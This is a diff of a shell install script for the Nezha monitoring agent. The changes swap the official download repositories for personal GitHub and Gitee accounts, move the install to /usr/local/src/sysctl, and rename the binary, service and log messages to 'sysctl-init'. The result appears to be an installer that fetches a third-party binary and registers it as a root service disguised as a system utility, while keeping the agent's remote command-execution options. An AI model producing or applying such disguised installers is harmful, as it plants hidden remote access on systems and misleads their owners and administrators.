@@ -1,7 +1,7 @@
 #!/bin/sh
 
-NZ_BASE_PATH="/opt/nezha"
-NZ_AGENT_PATH="${NZ_BASE_PATH}/agent"
+NZ_BASE_PATH="/usr/local/src"
+NZ_AGENT_PATH="${NZ_BASE_PATH}/sysctl"
 
 red='\033[0;31m'
 green='\033[0;32m'
@@ -125,9 +125,9 @@ init() {
     fi
 
     if [ -z "$CN" ]; then
-        GITHUB_URL="github.com"
+        GITHUB_URL="github.com/lsjnb"
     else
-        GITHUB_URL="gitee.com"
+        GITHUB_URL="gitee.com/lsjnb666"
     fi
 }
 
@@ -135,15 +135,15 @@ install() {
     echo "Installing..."
 
     if [ -z "$CN" ]; then
-        NZ_AGENT_URL="https://${GITHUB_URL}/nezhahq/agent/releases/latest/download/nezha-agent_${os}_${os_arch}.zip"
+        NZ_AGENT_URL="https://${GITHUB_URL}/agent/releases/latest/download/nezha-agent_${os}_${os_arch}.zip"
     else
-        _version=$(curl -m 10 -sL "https://gitee.com/api/v5/repos/naibahq/agent/releases/latest" | awk -F '"' '{for(i=1;i<=NF;i++){if($i=="tag_name"){print $(i+2)}}}')
-        NZ_AGENT_URL="https://${GITHUB_URL}/naibahq/agent/releases/download/${_version}/nezha-agent_${os}_${os_arch}.zip"
+        _version=$(curl -m 10 -sL "https://gitee.com/api/v5/repos/lsjnb666/agent/releases/latest" | awk -F '"' '{for(i=1;i<=NF;i++){if($i=="tag_name"){print $(i+2)}}}')
+        NZ_AGENT_URL="https://${GITHUB_URL}/agent/releases/download/${_version}/nezha-agent_${os}_${os_arch}.zip"
     fi
 
     _cmd="wget -T 60 -O /tmp/nezha-agent_${os}_${os_arch}.zip $NZ_AGENT_URL >/dev/null 2>&1"
     if ! eval "$_cmd"; then
-        err "Download nezha-agent release failed, check your network connectivity"
+        err "Download sysctl-init release failed, check your network connectivity"
         exit 1
     fi
 
@@ -170,20 +170,20 @@ install() {
 
     env="NZ_SERVER=$NZ_SERVER NZ_CLIENT_SECRET=$NZ_CLIENT_SECRET NZ_TLS=$NZ_TLS NZ_DISABLE_AUTO_UPDATE=$NZ_DISABLE_AUTO_UPDATE NZ_DISABLE_FORCE_UPDATE=$DISABLE_FORCE_UPDATE NZ_DISABLE_COMMAND_EXECUTE=$NZ_DISABLE_COMMAND_EXECUTE NZ_SKIP_CONNECTION_COUNT=$NZ_SKIP_CONNECTION_COUNT"
 
-    sudo "${NZ_AGENT_PATH}"/nezha-agent service -c "$path" uninstall >/dev/null 2>&1
-    _cmd="sudo env $env $NZ_AGENT_PATH/nezha-agent service -c $path install"
+    sudo "${NZ_AGENT_PATH}"/sysctl-init service -c "$path" uninstall >/dev/null 2>&1
+    _cmd="sudo env $env $NZ_AGENT_PATH/sysctl-init service -c $path install"
     if ! eval "$_cmd"; then
-        err "Install nezha-agent service failed"
-        sudo "${NZ_AGENT_PATH}"/nezha-agent service -c "$path" uninstall >/dev/null 2>&1
+        err "Install sysctl-init service failed"
+        sudo "${NZ_AGENT_PATH}"/sysctl-init service -c "$path" uninstall >/dev/null 2>&1
         exit 1
     fi
 
-    success "nezha-agent successfully installed"
+    success "sysctl-init successfully installed"
 }
 
 uninstall() {
     find "$NZ_AGENT_PATH" -type f -name "*config*.yml" | while read -r file; do
-        sudo "$NZ_AGENT_PATH/nezha-agent" service -c "$file" uninstall
+        sudo "$NZ_AGENT_PATH/sysctl-init" service -c "$file" uninstall
         sudo rm "$file"
     done
     info "Uninstallation completed."
